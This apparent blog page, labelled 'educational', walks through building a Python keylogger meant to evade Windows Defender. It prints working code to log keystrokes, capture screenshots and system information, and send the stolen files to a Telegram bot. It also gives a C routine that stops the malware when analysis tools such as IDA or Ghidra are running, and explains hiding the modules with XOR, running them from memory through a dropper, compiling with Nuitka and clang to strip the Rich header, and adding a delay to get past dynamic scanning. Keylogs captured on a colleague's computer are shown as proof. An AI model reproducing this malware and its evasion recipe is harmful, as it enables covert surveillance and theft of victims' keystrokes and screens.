<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Malware Dev - YUGNOY</title>
    <link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="css/cyber-theme.css">
</head>
<body>
    <div class="container">
        <!-- SIDEBAR NAV -->
        <aside class="sidebar">
            <div class="sidebar-header">
                <h1 class="logo">YUGNOY</h1>
                <p class="tagline">Cybersecurity projects</p>
            </div>
            <nav class="nav-menu">
                <a href="index.html" class="nav-item">
                    <span class="icon">üíª</span> Main
                </a>
                <a href="malware.html" class="nav-item">
                    <span class="icon">üëæ</span> Malware I
                </a>
                <a href="puzzlesql.html" class="nav-item">
                    <span class="icon">üíâ</span> PuzzleSQL
                </a>
                <a href="code_analysis1.html" class="nav-item">
                    <span class="icon">‚öôÔ∏è</span> Code Analysis I
                </a>
            </nav>
        </aside>

        <!-- MAIN CONTENT -->
        <main class="main-content">

<section id="malware" class="page">
                <div class="page-header cyber-header red">
                    <h1 class="page-title">How a python keylogger can bypass Windows Defender?</h1>
                    <p class="page-subtitle">‚ö†Ô∏è Educational context only - Lab simulation</p>
                </div>

                <div class="toc-section">
                    <h2>Summary</h2>
                    <ul class="toc">
                        <li><a href="#scope">Scope</a></li>
                        <li><a href="#tldr">TL;DR</a></li>
                        <li><a href="#functionalities">Functionalities</a>
                            <ul>
                                <li><a href="#keylogging">Keylogging</a></li>
                                <li><a href="#sysinfo">System Info & Screenshot</a></li>
                            </ul>
                        </li>
                        <li><a href="#exfiltration">Exfiltration</a>
                            <ul>
                                <li><a href="#discord">Discord case</a></li>
                                <li><a href="#telegram">Telegram case</a></li>
                            </ul>
                        </li>
                        <li><a href="#evasion">Evasion Techniques</a>
                            <ul>
                                <li><a href="#syscall">Syscall Function</a></li>
                                <li><a href="#static">Bypassing the Static Analysis</a></li>
                                <li><a href="#nuitka">Nuitka, Clang and LLVM</a></li>
                                <li><a href="#dynamic">Dynamic problem</a></li>
                            </ul>
                        </li>
                        <li><a href="#malware-test">Malware test</a></li>
                        <li><a href="#why-works">Why it works?</a></li>
                        <li><a href="#sources">Complementary Sources</a></li>
                    </ul>
                </div>

                <div class="info-box info-primary">
                    <p>Go to <a href="https://github.com/Fournoy/yugnoy/tree/main/additional_code/Malware_dev_I" target="_blank">GitHub page</a> to see additional resources like dropper code, main.py code and syscall_function.c code.</p>
                </div>

                <!-- SCOPE SECTION -->
                <section id="scope" class="content-section">
                    <h2>Scope</h2>
                    <p>Before we begin, let's first talk about the scope. The Windows Defender used is the standard home version with all parameters activated. We will not discuss EDR or other antivirus solutions. Initially, this project aimed to understand how an antivirus like Windows Defender (at home) can be bypassed in order to run malware on the system. Future projects like this will be improved to bypass antivirus solutions as much as possible, using more advanced techniques.</p>
                </section>

                <!-- TL;DR SECTION -->
                <section id="tldr" class="content-section">
                    <h2>TL;DR</h2>
                    <p>While malware can be written in C/C++, PowerShell, Bash, or VBScript, this implementation uses <strong>Python</strong> for its simplicity and accessibility. More advanced components (e.g. rootkits) would likely require C/C++, but for our <strong>keylogger</strong>, we stick to Python. The testbed environment is a <strong>Windows-based environment</strong>. We restrict our testing and simulations to this OS only using Windows Defender.</p>
                    <ul>
                        <li><strong>Functionalities of the malware:</strong>
                            <ul>
                                <li><strong>Keylogging</strong> using Python modules (e.g., <code>pynput</code>)</li>
                                <li><strong>Screenshot capture</strong></li>
                                <li><strong>Data exfiltration simulation</strong> (e.g., sending to a Telegram bot)</li>
                            </ul>
                        </li>
                        <li><strong>Attacker-side:</strong> Logs and screenshots are sent to a <strong>Telegram serveur</strong>.</li>
                        <li><strong>Detection & Stealth:</strong> The key focus of this experience is <strong>evasion</strong>. Building the logger is not the challenge; staying undetected is. Thus, we also investigate:
                            <ul>
                                <li>How AV solutions detect Python malware</li>
                                <li>Techniques to reduce the detection surface (e.g., obfuscation, syscall-based execution, etc...)</li>
                            </ul>
                        </li>
                    </ul>
                    <p>In resume, the keylogger will use Python for the main functionality. Taking screenshots, registering keylogs and sending the photos and logs to a server. Also, the keylogger will have a dll file written in C. The main purpose here is to provide the keylogger with AV (antivirus) detection functionalities. We will see that later.</p>
                    <h3 style="text-align: center;">Let's begin this very interesting journey !</h3>
                </section>

                <!-- FUNCTIONALITIES -->
                <section id="functionalities" class="content-section">
                    <h2 style="text-align: center;">Functionalites:</h2>
                    
                    <div class="info-box info-primary">
                        <p>Here, we will see what types of functionalites we will use for the keylogger</p>
                    </div>

                    <h3 id="keylogging" style="text-align: left;">Keylogging</h3>
                    <p>The keylogger need of course to log every key typed in the keyboard. For that we have several possibilitys. We can use hook function in order to intercept the input of the target. For that we can use the API windows. In python we have win32 module to use API function by windows. But we will use Pynput module, more especially the keyboard class. The main objective here is to build the most simplest malware to bypass protection. With Pynput module, we can with simplicity, log the key typed by the target in his keyboard. The module use WinAPI, so we need to be careful using it. We have higher chance to trigger the AV.</p>
                    
                    <div class="info-box info-warning">
                        <p>Here the python code for the keylogging functionality :</p>
                    </div>

                    <pre><code>
            class Keylogger:

                    def __init__(self, log_file: str ):
                        self.log_file = log_file
                        self.listener = None   
                        self.pause_event = threading.Event()
                        self.pause_event.set()
                        
                    def on_press(self, key):
                        self.pause_event.wait()  #wait if in  pause 
                        with open(self.log_file,'a') as f:
                            if key  == keyboard.Key.space:
                                f.write(' ')
                            elif key == keyboard.Key.enter:
                                f.write('\n')
                            elif key == keyboard.Key.backspace: 
                                f.write(' *backspace* ') 
                            else: 
                                key_str = str(key).strip("'")
                                (f.write(f"{key_str}"))     
                    
                    def start_(self):
                        self.listener = keyboard.Listener(on_press=self.on_press)
                        self.listener.start()

                    def stop_(self):
                        if self.listener is not None:
                            self.listener.stop()
                    
                    def pause(self):
                        self.pause_event.clear()
                    
                    def resume(self):
                        self.pause_event.set()
                    </code></pre>

                    <p>As you can see, we using pynput library with keyboard class to hook the key pushed by the target. I adjusted the function with a few modifications in outputs to help myself read the log file more efficiently. But as you can see, i just converted three key, characters like '&', '@' and so on, will be placed with their proper pynput markup.</p>

                    <p>The magic happens around the on_press() function. It will open a file (placed in the TEMP directory) and will append as many keys as are pressed by the target. It will translate when it can, and will remove unnecessary strings like " ' ". Threading functions  are used to manage the different functionalities of the malware more correctly. start, stop, pause and resume function are used in the main file of the malware to prevent race condition.</p>

                    <div class="info-box info-primary">
                        <p>Now, let's see the second class used by the malware</p>
                    </div>

                    <h3 id="sysinfo">System Info & Screenshot</h3>
                    <pre><code>
class Info_screen:
    def __init__(self, log_file_name, screen_file_name):
        self.log_file_name =  log_file_name
        self.screen_file_name =  screen_file_name
        self.pause_event = threading.Event()
        self.pause_event.set()
    
    def os_information(self):
        os_inf_gath = platform.platform()

        file_path = tempfile.gettempdir()  # Exemple : C:\Users\Username\AppData\Local\Temp
        os.makedirs(file_path, exist_ok=True)

        log_file = os.path.join(file_path, self.log_file_name)
        name_target = os.environ.get('COMPUTERNAME')
        with open(log_file,'a') as f:
            timestamp = datetime.datetime.now().strftime("Day: %Y-%m-%d__Hour: %H-%M-%S")
            f.write(f"---OS INFORMATION -> {os_inf_gath} : {timestamp} => {name_target}\n")
        return log_file
    
    

    def screen_shot(self):
        os.makedirs(self.screen_file_name, exist_ok=True)
        while True:
            try:
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
                
                screenshot_path = os.path.join(self.screen_file_name, f"screenshot_{timestamp}.png")
                
                screenshot = ImageGrab.grab()
                screenshot.save(screenshot_path)
                print(f"Screenshot saved: {screenshot_path}")
                
            except Exception as e:
                print(f"Error capturing screenshot: {e}")
            
            time.sleep(5)
    
    def pause(self):
        self.pause_event.clear()

    def resume(self):
        self.pause_event.set()
    </code></pre>

                    <p>This module collects OS information in a file where the keylog will be placed and takes periodic screenshots using PIL.ImageGrab. The main goal here, is to have as much information as we can. We can also exfiltrate files and directories but I will not do that for this keylogger. Like the first code, we adjust it with new functions in order to prevent race conditions (very important).</p>

                    <div class="info-box info-primary">
                        <p>Thread function are used due to the use of functions that run continuously.</p>
                    </div>

                    <div class="info-box info-warning">
                        <p>Little warning concerning these functions :</p>
                    </div>

                    <p>These functions use the pynput module, and pynput uses the Windows API. In other words, this is VERY bad. Using Python forces us to use functions through the Windows API. Why is this bad? <strong>AV detects it</strong>. AV hooks API functions and will detect if a program runs some of these functions, it make a correlation between the used API and the most popular APIs call made by known malware. That's why malware uses undocumented functions, or <strong>syscalls</strong>. <strong>Syscalls</strong> are very important if you want to evade AV. But of course, using them with Python is not the best idea; for that, we need to use the C language, but we will see that later. Let's focus on Python code and the pynput module. We are practically shooting ourselves in the foot, but it's a good challenge.</p>

                    <h3 style="text-align: left;">What next ?</h3>

                    <div class="info-box info-primary">
                        <p>We have the main function used by the malware, now, we will talk about exfiltration.</p>
                    </div>

                    <p>Before talking about the C part, we need to see how to exfiltrate our stolen data. For that let's see how other viruses work, for exemple <a href="https://www.cyfirma.com/research/lumma-stealer-tactics-impact-and-defense-strategies/" target="_blank">Lumma Stealer</a> uses a remote C2 (Command & Control) server. For this first malware, we will not do that, due to the objective to make the most easiest malware possible to evade Windows AV. For that, we need a server to exfiltrate data, such as web server.</p>

                    <h3 id="discord" style="text-align: left;">Discord case</h3>

                    <p>For example, like in this <a href="https://www.cyfirma.com/research/technical-malware-analysis-report-python-based-rat-malware/" target="_blank">Python RAT malware</a>, we can use Discord to exfiltrate data. At first, i was doing this (using Discord webhook), but i encountered a problem while testing my Keylogger <strong>Discord BOT</strong>. They just closed the server for non-compliance with the user charter. It's fair enough, but I need a server to exfiltrate the stolen data. For that, and like a lot of malware during a certain time, we will use <strong><em>Telegram</em></strong>.</p>

                    <h3 id="telegram" style="text-align: left;">Telegram case</h3>

                    <p>In fact, this is a good idea. It's pretty clean, pretty simple to use, and we can access the server from anywhere. <strong>BUT</strong>, AV can maybe detected it. We are not talking about Windows Defender (on its own), but some AV and EDR (Endpoint Detection and Response) solutions can detect packets sent to Telegram, because of the high usage by malware. So keep in mind that this malware can be used <strong>only</strong> against Windows Defender. One day we will level up, but for now, let's focus on our purpose.</p>
                </section>

                <!-- EXFILTRATION -->
                <section id="exfiltration" class="content-section">
                    <h2 style="text-align: center;">Exfiltration</h2>
                    <p>To exfiltrate data, we need to send packets to a server. We will use a Telegram bot with the Telegram API to send data. But what format? Stolen data will be files (keyboard logs) and zip files (screenshots). Telegram allows us to send them to a private room. But it's important to understand that in a real scenario, Telegram is not the best choice. Having our own remote server is better. Of course, we can use any type of server, even Google Drive or Gmail, but in fact, having control over data flow, data processing and having control of the server, is more important. You can look at some well-known malware to see that they generally use their own server.</p>
                    
                    <pre><code>
class InfoToSend:
    def __init__(self, url, file_path, file_name, chat_id):
        self.url = url
        self.file_path = file_path
        self.file_name = file_name
        self.chat_id = chat_id
        
    def sender_file(self):
        reel_file_path = os.path.join(self.file_path, self.file_name)
        try: 
            with open(reel_file_path, 'rb') as f:
                files = {'document': f}
                data = {'chat_id': self.chat_id}
                requests.post(self.url, files=files, data=data)
        except Exception as e:
            print(f"Error during exec shifu_sender_file function : {e}")
        </code></pre>

                    <p>As you can see, we put in any security to protect data. The way to upgrade this will be the encryption of files sent to the telegram server, then decrypted it after download. But for this scenario, encrypting or not encrypting data will change nothing.</p>

                    <p>Let's dive into the best part of making malware (and the most difficult): the <strong>evasion</strong> techniques.</p>

                    <div class="info-box info-primary">
                        <p>How will we evade Windows Defender for this keylogger ?</p>
                    </div>
                </section>

                <!-- EVASION TECHNIQUES -->
                <section id="evasion" class="content-section">
                    <h2 style="text-align: center;">Evasion Techniques</h2>
                    <p>In fact, a lot of techniques can be used, but for this keylogger we will prefer the first choice.</p>

                    <p>First of all, you can read further to understand the assignment with this <a href="https://www.hackmosphere.fr/bypass-windows-defender-antivirus-2025-part-1/" target="_blank">link</a>. Now let's see how this works. First, it's important to understand that we are using different techniques, from XOR to Syscall and passing through obfuscation and even the Clang-cl option on Nuitka. All these techniques will help us evade AV. We cannot use just one and hope that it will work. To evade AV, we need to have different approaches and to keep up with new trends.</p>

                    <h3 id="syscall" style="text-align: left;">Syscall Function</h3>

                    <p>Syscalls play a critical role in malware programming, see this <a href="https://www.hackmosphere.fr/bypass-windows-defender-antivirus-2025-part-2/" target="_blank">link</a>. As I mentioned earlier, antivirus software often monitors Windows API functions. They hook into these APIs to analyze program behavior during dynamic analysis, and certain API calls can trigger detection. So, to avoid these, you need to use undocumented Windows functions. The function we will make here is a technique used to avoid analysis in our program. When running, before proceeding, it will check if any malware analysis software is in use on the target system. If it's true, the keylogger will stop itself and will not run, in order to avoid analysis.</p>

                    <p><a href="https://0xpat.github.io/Malware_development_part_2/" target="_blank">Here</a> you have examples of avoiding malware analysis, outside and inside a sandbox. The best technique shown in the paper is to detect physical components inside the system you are running on. For example, a sandbox used by AV will have two CPUs. So, if the code finds less than two running CPUs, it will stop its execution. We can do that even with pc fan ! For our project, we will choose something different. The malware will first examine all the running processes and compare the program names with a blacklist. In case of a match, the execution will stop immediately. But to do this, we will use the C language. We could use Windows API and play with these functions, but the risk is to be detect. We are already using WIN API for the keylogging, so we need to do something different now. In addition, this is one of the first executions, so we need to be discreet. Let's use Syscall!</p>

                    <pre><code>
int main() {
    // Pour afficher les caract√®res Unicode
    SetConsoleOutputCP(CP_UTF8);

    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    if (!hNtdll) {
        printf("Erreur de chargement ntdll.dll\n");
        return 1;
    }


    NtQuerySystemInformation_t NtQuerySystemInformation =
        (NtQuerySystemInformation_t)GetProcAddress(hNtdll, "NtQuerySystemInformation");


    if (!NtQuerySystemInformation) {
        printf("Erreur de r√©solution de NtQuerySystemInformation\n");
        return 1;
    }

    ULONG bufferLength = 1024 * 1024;
    PVOID buffer = malloc(bufferLength);
    if (!buffer) {
        printf("Erreur allocation m√©moire\n");
        return 1;
    }
    ULONG returnLength = 0;

    NTSTATUS status = NtQuerySystemInformation(SystemProcessInformation, buffer, bufferLength, &returnLength);
    if (status != 0) {
        printf("NtQuerySystemInformation a √©chou√© : 0x%08X\n", status);
        free(buffer);
        return 1;
    }

    PSYSTEM_PROCESS_INFORMATION current = (PSYSTEM_PROCESS_INFORMATION)buffer;

    const wchar_t* list_tools_analysis[] = {
        L"ida.exe",            
        L"ida64.exe",           
        L"ghidraRun.exe",                      
        NULL
    };
    
    while (TRUE) { 
            for (int i =0;  list_tools_analysis[i] != NULL; i++){    
                if (current->ImageName.Buffer != NULL) {
                    wchar_t* filename = wcsrchr(current->ImageName.Buffer, L'\\'); //on r√©cup√®re uniquement le nom du logiciel (pas son path)
                    if (filename) filename++; else filename = current->ImageName.Buffer;
                    if (wcsicmp(filename, list_tools_analysis[i]) == 0) { //comparaison insensible √† la case
                        free(buffer);
                        return FALSE;
                    }
                } 

            if (current->NextEntryOffset == 0) {
                free(buffer);
                return TRUE;
            }
            }
            current = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)current + current->NextEntryOffset);
    }

    return 0;
}
</code></pre>

                    <p>The code was pretty hard to use; thankfully, I was helped by Google and AI to make it correctly. There are also tools like SysWhisper(2&3) that provide pre-built Syscalls. You will find documentation about Syscall in the complementary sources section. As you can see, it will compare with the blacklist manually incorporated in the main code.</p>

                    <p>The main difference between API call and Syscall call, is that the programm use directly the ntdll.dll file. We 'bypass" the API monitor to get directly the function we want. See the previous link or direclty into the <em>Complementary Source</em> to go further into Undocumentend Function.</p>

                    <p>Let's see how it looks when executed.</p>

                    <div class="video-container">
                        <video controls>
                            <source src="assets\image\video\video_poc_protection.mp4" type="video/mp4">
                            Your browser does not support the video tag.
                        </video>
                        <p style="text-align: center; color: #0f0; font-weight: bold; margin-top: 1rem;">It work perfectly !</p>
                    </div>

                    <h3 id="static" style="text-align: left;">Bypassing the Static Analysis</h3>

                    <p>Here is the part changed everything when i created the keylogger. In first , i used Pyinstaller to make an "wrapper" of my python code. And windows triggered it, sometimes not, but for a short period of time (few hours) before it got stopped when executed. So i chose another tool, <strong>Nuitka</strong>. Using it with default parameters was not the best option at first place. With basic compilation using CL compiler and with only obfuscation in the python code, the executable triggered the AV each time i compile it, so i can't even see the file being created in the directory !</p>

                    <img src="assets/image/cl_bad_compiler.jpg" alt="CL Compiler issue" style="max-width: 100%; border-radius: 5px; margin: 1rem 0;">
                    <p style="text-align: center; color: #aaa; font-size: 0.9em;">Traduction and Compilation with Nuitka using CL compilator</p>

                    <p>As you can see, using cl compiler, even if we use code obfuscation in the python code, will not work. But why ?</p>
                    <p>- First : Using only python code obfuscation is not enought. For the keylogger, we can't just inject junk code or change the variable etc... Here is an exemple of how it looks :</p>

                    <pre><code>
iiiIIIiiIIiiI = 1
for iiiIIIiiIIiiI =1:
    OOoooOOoOo= 2
    pass

for OOoooOOoOo + iiiIIIiiIIiiI = 2:
    continue
else:
    IiiIIIiiII = 5

def main():
    main code
    ...
    iiiIIIiiIIiiI = 1

for iiiIIIiiIIiiI =1:
    OOoooOOoOo= 2
    pass

for OOoooOOoOo + iiiIIIiiIIiiI = 2:
    continue
else:
    IiiIIIiiII = 5
</code></pre>

                    <p>The code have junk code but we need more in term of obfuscation. The main thing that change everything it using <a href="https://www.hackmosphere.fr/bypass-windows-defender-antivirus-2025-part-2/" target="_blank">XOR encryption</a>. To make it right, we will use a dropper. The dropper will be the code that executes the main code of the malware. It will search for files and execute them directly into the code (like i explain before). It will be the executable file, the others will remain XORed file. We will se that later ! Let's focus into the compilation problem.</p>

                    <h3 id="nuitka" style="text-align: center;">Nuitka, Clang and LLVM</h3>

                    <p>The obfuscation problem still remains because of the compilation using nuitka and CL (windows compilator). For that, we will use an 'LLVM-based' compilator. It will use the front-end of it and this will be a game changer, this is <em>--clang</em> option in Nuitka. Here we're going deep in the PE format file on windows, so take a look in sources complentary to go further. <strong>When using cl compilator with Nuitka, Windows Defender always detect it, even before stop to finish the compilation, a reel blocage.</strong> First, with the default parameter, when compilation working, AV flagged the dropper with this message: Program:Win32/Wacapew.C!ml Searching on forum, article etc... I found that sometimes, even with legitimate software, windows can be trigged. Like this <a href="https://github.com/Nuitka/Nuitka/issues/2163" target="_blank">one</a>. Keep in mind that it's a 2023 forum.</p>

                    <p>Like the guy in the forum, i was using nuitka with default compilator (cl.exe), and i had a clue. Microsoft toolset when compilating creates a Rich header on the PE file. This rich header, in addition with other static analysis techniques, can be used to match with malware. As an exemple you can see <a href="https://github.com/actions/runner-images/issues/9403" target="_blank">someone</a> using clang-cl in Visual Studio, so with microsoft toolset, so with Rich Header in the executable, and it still be triggered by the windows defender. So i go deeper into the rich header and i found that it serve to know information in the PE format, like the technologies (import resources, language used) in it, or even scope of the project and that how Rich header can be used as a signature or fingerprint, in addition with fuzzyhash and fuzzy imphash for exemple.</p>

                    <p>But with nuitka and the <em>--clang</em> option, i was astonished to found that the Rich header doesn't exist at all. With PE-Bear i analysed the dropper (only executable file of the malware) and the Rich Header is unvailable, because of the use of clang-cl compilator (no Microsoft toolset), even if we running it in a windows environment. The Clang-CL compilor will not place windows artifacts like Rich Header.</p>

                    <img src="assets/image/pe_bear.jpg" alt="PE Bear Analysis" style="max-width: 100%; border-radius: 5px; margin: 1rem 0;">
                    <p style="text-align: center; color: #aaa; font-size: 0.9em;">The Rich header hash is not available.</p>

                    <p>This lack of PE Header help us to bypass the Windows AV. Because of the non-use of Microsoft product during the development (even if we using Clang-cl) the PE Header cannot be available.</p>

                    <h3 id="dynamic" style="text-align: center;">Dynamic problem</h3>

                    <img src="assets/image/Capture d'√©cran 2025-07-16 125957.png" alt="Dynamic Detection 1" style="max-width: 100%; border-radius: 5px; margin: 1rem 0;">
                    <p style="text-align: center; color: #aaa; font-size: 0.9em;">Windows Defender dectects dynamically the malware for the first time</p>

                    <img src="assets/image/Capture d'√©cran 2.png" alt="Dynamic Detection 2" style="max-width: 100%; border-radius: 5px; margin: 1rem 0;">
                    <p style="text-align: center; color: #aaa; font-size: 0.9em;">It's the exact same dropper but with a different security message...</p>

                    <p>In first, even before using clang, the malware was a one-file type. But i quickly saw that it would always be triggered because of the obvious behavior of the malware. So i needed to change the functioning. For that i split the malware into five files: two for the main functions (keylogging and telegram sending) and two other for the protection function against analysis and for the main file (the orchestrator), the dropper. The dropper is the fifth file, the only executable file, the other are just XOR encrypt files. The dropper will deXOR files and run them "inside itself", in other words, run them during execution with an exec() (Python) function, so it will run code directly into flash memory.</p>

                    <img src="assets/image/Diagram_malware.jpg" alt="Malware Diagram" style="max-width: 100%; border-radius: 5px; margin: 1rem 0;">
                    <p style="text-align: center; color: #aaa; font-size: 0.9em;">How the malware process during launch</p>

                    <p>At first, the malware worked in my lab. I was happy and very excited to right this report. But, when i tested it on another computer, Windows Defender triggered it directly because of DYNAMIC analysis (again...). I started to look some techniques, maybe using Syscall for all the functions using Windows API, but i was far from that. So i started to play with the behavior of the malware. I added a simple <code>time.sleep(20)</code> in the dropper to see if it would work. And miraculously, Windows Defender wasn't able to detect it, even after few days. So we can confirm that statically, the keylogger bypasses Windows Defender. And now, with the waiting time, it can bypass dynamic analysis performed by Windows Defender.</p>

                    <p><em>Before to show you the execution of the Keylogger, it's legitimate to know which configuration i used with Windows Defender, in fact everything was on, even the protection against ransomware but with the default parameters (of course). So running from the desktop will trigger nothing (not the same story into the documents directory, AV will detect that an executable is playing with files and directory, but will not flag it as malware). The only disable parameter is the smart app control (i wasn't able to activate it). In resume, Windows Defender at home with all parameter activate.</em></p>

                    <p><strong>Now, i'm happy to show you the keylogger !</strong> Tested on my colleague's computer**</p>

                    <div class="video-container">
                        <video controls>
                            <source src="assets\image\video\New_proof_20s_malware.mp4" type="video/mp4">
                            Your browser does not support the video tag.
                        </video>
                    </div>
                </section>

                <!-- MALWARE TEST -->
                <section id="malware-test" class="content-section">
                    <h2 style="text-align: center;">Screenshot data</h2>
                    <p>After 15min, the malware send to my telegram server the keylog and the screenshots in a zip file :</p>

                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; margin: 1rem 0;">
                        <div>
                            <img src="assets/image/screenshot1.png" alt="Screenshot 1" style="max-width: 100%; border-radius: 5px;">
                            <p style="text-align: center; color: #aaa; font-size: 0.9em;">Screenshot during internet research</p>
                        </div>
                        <div>
                            <img src="assets/image/screen_certi.png" alt="Screenshot Certificate" style="max-width: 100%; border-radius: 5px;">
                            <p style="text-align: center; color: #aaa; font-size: 0.9em;">Another screenshot</p>
                        </div>
                    </div>

                    <h2 style="text-align: center;">Keylog data</h2>
                    <p>During the execution, the malware registered the key used by the target :</p>

                    <pre><code>
---OS INFORMATION -> Windows-11-10.0.26100-SP0 : Jour: 2025-07-10__Heure: 15-49-40 => DL5420
http debugger
certfi *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace* hello this is a other test !!! :) 
*backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  
*backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  
*backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace* certi
Key.cmdKey.tabjhgjygyjgjKey.esc</code></pre>

                    <p>It's horrible to read, i was to lazy to write a code to convert it into a readable text, so with LLM and manually, i changed the original file and got this. Using LLM can be intersting for files with a lot of data.</p>

                    <pre><code>OS INFORMATION -> Windows-11-10.0.26100-SP0
Jour : 2025-07-10
Heure : 15-49-40
Name's target => DL5420

*During research on browser* => http debugger
*Search a certificate* => certfi
hello this is a other test !!! :)
*Management of certifications in order to use http_debugger* => certi
*???* => Key.cmdKey.tabjhgjygyjgjKey.esc</code></pre>

                    <p>As you can see, we can elaborate an understanding of what the target doing with screenshot AND keylogs.</p>
                </section>

                <!-- WHY IT WORKS -->
                <section id="why-works" class="content-section">
                    <h2 style="text-align: center;">Why it works?</h2>

                    <div class="info-box info-success">
                        <h3>One : PE HEADER FORMAT</h3>
                        <p>Without the Rich Header, Windows Defender loses an identifier fragment, it can't make a relation (around the compilation chain) between the program and known malware for exemple. At this point, i didn't find information about why i can bypass Windows Defender without the Rich Header, maybe this PE header fragment has no importance during static analysis (performed by Windows Defender). At this stage, it's more a deduction than a certainty, so take it with a pinch of salt.</p>
                    </div>

                    <div class="info-box info-success">
                        <h3>Two : OBFUSCATION CODE</h3>
                        <p>The second possiblity is the use of LLVM front-end. The C code (traduce by Nuitka from the python source code using clang-cl) will be transform in a Intermediate Representation thanks to LLVM front-end and it can help to obfuscate the code. Nuitka will "traduce" the python code using libpython and the intermediate code is very hard to read. It can be use as an obfuscation, additionally, the junk code will help because it will be also "traduce" by Nuitka. But the thing is, only the dropper is compilate, and that's why our third hypothesis is...</p>
                    </div>

                    <div class="info-box info-success">
                        <h3>Three : NUITKA, C and LIBPYTHON</h3>
                        <p>The traduce-by-Nuitka dropper will use libpython for interpreting the code. It will execute it direclty into the memory, that can bypass AV detection. Windows Defender (in our scope) is file-dependent and need visibility to avoid threat. That why the dynamic code can easily bypass the AV.</p>
                    </div>

                    <div class="info-box info-success">
                        <h3>Four: TECHNIQUE IMPORT</h3>
                        <p>To import module, i used importlib. He will import library dynamically, so during the code execution. You can see how it works with the dropper code in the GitHub page !</p>
                    </div>

                    <div class="info-box info-success">
                        <h3>Five: Flash-Memory Execution</h3>
                        <p>The malware run other file directly in the dropper. In other world, it will not use processor during the captation of information (but it will use it during the sending AND at the beginning of the program). An antivirus play around the processor execution so using flash-memory and fileless (not in this case) programm it become more simple to bypass protection. Malware today don't even use C/Python or other language to drop processus but for exemple native windows language like Powershell. Fileless malware are more performant and using native language keep them close to WinAPI without suspicion. But this work against Antivirus, EDR (Endpoint Detection & Response) will make it harder.</p>
                    </div>
                </section>

                <!-- SOURCES -->
                <section id="sources" class="content-section">
                    <h2 style="text-align: center;">Complementary Sources</h2>

                    <h3>General Techniques for malware writing</h3>
                    <ul>
                        <li><a href="https://0xpat.github.io/" target="_blank">https://0xpat.github.io/</a></li>
                        <li><a href="https://www.hackmosphere.fr/bypass-windows-defender-antivirus-2025-part-2/" target="_blank">https://www.hackmosphere.fr/bypass-windows-defender-antivirus-2025-part-2/</a></li>
                    </ul>

                    <h3>Evasion Techniques using hardware analysis</h3>
                    <ul>
                        <li><a href="https://www.gdatasoftware.com/blog/2020/05/36068-current-use-of-virtual-machine-detection-methods" target="_blank">https://www.gdatasoftware.com/blog/2020/05/36068-current-use-of-virtual-machine-detection-methods</a></li>
                        <li><a href="https://andreafortuna.org//2018/05/21/malware-vm-detection-techniques-evolving-an-analysis-of-gravityrat/" target="_blank">https://andreafortuna.org//2018/05/21/malware-vm-detection-techniques-evolving-an-analysis-of-gravityrat/</a></li>
                        <li><a href="https://0xpat.github.io/Malware_development_part_2/" target="_blank">https://0xpat.github.io/Malware_development_part_2/</a></li>
                    </ul>

                    <h3>Syscall Function</h3>
                    <ul>
                        <li><a href="http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FSystem%20Information%2FNtQuerySystemInformation.html" target="_blank">http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FSystem%20Information%2FNtQuerySystemInformation.html</a></li>
                        <li><a href="https://learn.microsoft.com/fr-fr/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation" target="_blank">https://learn.microsoft.com/fr-fr/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation</a></li>
                    </ul>

                    <h3>Static Analysis (PE Header, Rich header, Clang...)</h3>
                    <ul>
                        <li><a href="https://offwhitesecurity.dev/malware-development/portable-executable-pe/rich-header/" target="_blank">https://offwhitesecurity.dev/malware-development/portable-executable-pe/rich-header/</a></li>
                        <li><a href="https://0xrick.github.io/win-internals/pe3/#rich-header" target="_blank">https://0xrick.github.io/win-internals/pe3/#rich-header</a></li>
                        <li><a href="https://learn.microsoft.com/en-us/windows/win32/debug/pe-format" target="_blank">https://learn.microsoft.com/en-us/windows/win32/debug/pe-format</a></li>
                        <li><a href="https://www.virusbulletin.com/virusbulletin/2020/01/vb2019-paper-rich-headers-leveraging-mysterious-artifact-pe-format/" target="_blank">https://www.virusbulletin.com/virusbulletin/2020/01/vb2019-paper-rich-headers-leveraging-mysterious-artifact-pe-format/</a></li>
                        <li><a href="https://connect.ed-diamond.com/misc/misc-121/analyse-statique-des-executables-windows-la-structure-pe" target="_blank">https://connect.ed-diamond.com/misc/misc-121/analyse-statique-des-executables-windows-la-structure-pe</a></li>
                    </ul>
                </section>

            </section>

        </main>
    </div>
</body>
</html>